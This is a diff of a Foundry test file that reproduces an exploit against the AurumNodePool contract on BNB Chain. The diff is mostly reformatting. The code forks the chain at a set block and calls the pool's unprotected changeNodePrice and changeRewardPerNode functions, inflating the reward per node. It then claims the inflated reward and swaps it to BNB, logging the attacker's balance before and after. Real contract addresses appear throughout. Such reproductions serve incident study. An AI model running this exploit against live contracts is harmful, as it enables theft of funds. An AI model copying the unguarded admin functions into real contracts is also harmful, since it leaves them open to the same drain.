@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @Analysis
@@ -13,7 +13,6 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // https://phalcon.blocksec.com/tx/bsc/0x7f031e8543e75bd5c85168558be89d2e08b7c02a32d07d76517cdbb10e279782
 
 interface IAurumNodePool {
-
     struct NodeEntity {
         uint256 nodeId;
         uint256 creationTime;
@@ -25,18 +24,23 @@ interface IAurumNodePool {
     function changeRewardPerNode(uint256 _rewardPerDay) external;
     function claimNodeReward(uint256 _creationTime) external;
 
-    function getRewardAmountOf(address account, uint256 creationTime) external view returns (uint256);
-    function getNodes(address account) external view returns (NodeEntity[] memory nodes);
-
+    function getRewardAmountOf(
+        address account,
+        uint256 creationTime
+    ) external view returns (uint256);
+    function getNodes(
+        address account
+    ) external view returns (NodeEntity[] memory nodes);
 }
 
 contract ContractTest is Test {
-
     IERC20 AUR = IERC20(0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
 
-    IAurumNodePool AurumNodePool = IAurumNodePool(0x70678291bDDfd95498d1214BE368e19e882f7614);
-    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IAurumNodePool AurumNodePool =
+        IAurumNodePool(0x70678291bDDfd95498d1214BE368e19e882f7614);
+    IUniswapV2Router Router =
+        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     function setUp() public {
         vm.createSelectFork("bsc", 23_282_134);
@@ -47,22 +51,34 @@ contract ContractTest is Test {
         AUR.approve(address(AurumNodePool), type(uint256).max);
         AUR.approve(address(Router), type(uint256).max);
 
-        emit log_named_decimal_uint("[Start] Attacker BNB balance before exploit", address(this).balance, 18);
+        emit log_named_decimal_uint(
+            "[Start] Attacker BNB balance before exploit",
+            address(this).balance,
+            18
+        );
 
         BNBtoAUR(0.01 ether);
 
         AurumNodePool.changeNodePrice(1_000_000_000_000_000_000_000);
         AurumNodePool.createNode(1);
 
-        IAurumNodePool.NodeEntity[] memory nodes = AurumNodePool.getNodes(address(this));
+        IAurumNodePool.NodeEntity[] memory nodes = AurumNodePool.getNodes(
+            address(this)
+        );
 
         vm.roll(23_282_171);
         vm.warp(1_669_141_486);
 
-        AurumNodePool.changeRewardPerNode(434_159_898_144_856_792_986_061_626_032);
+        AurumNodePool.changeRewardPerNode(
+            434_159_898_144_856_792_986_061_626_032
+        );
 
         emit log_named_uint(
-            "AurumNodePool Attacker reward:", AurumNodePool.getRewardAmountOf(address(this), nodes[0].creationTime)
+            "AurumNodePool Attacker reward:",
+            AurumNodePool.getRewardAmountOf(
+                address(this),
+                nodes[0].creationTime
+            )
         );
 
         require(block.timestamp > nodes[0].lastClaimTime);
@@ -71,16 +87,20 @@ contract ContractTest is Test {
 
         AURtoBNB();
 
-        emit log_named_decimal_uint("[End] Attacker BNB balance after exploit", address(this).balance, 18);
+        emit log_named_decimal_uint(
+            "[End] Attacker BNB balance after exploit",
+            address(this).balance,
+            18
+        );
     }
 
     function BNBtoAUR(uint256 amount) internal {
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(AUR);
-        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
-            0, path, address(this), block.timestamp + 60
-        );
+        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{
+            value: amount
+        }(0, path, address(this), block.timestamp + 60);
     }
 
     function AURtoBNB() internal {
@@ -88,11 +108,14 @@ contract ContractTest is Test {
         path[0] = address(AUR);
         path[1] = address(WBNB);
         Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            AUR.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
+            AUR.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp + 60
         );
     }
 
     receive() external payable {}
     fallback() external payable {}
-
 }
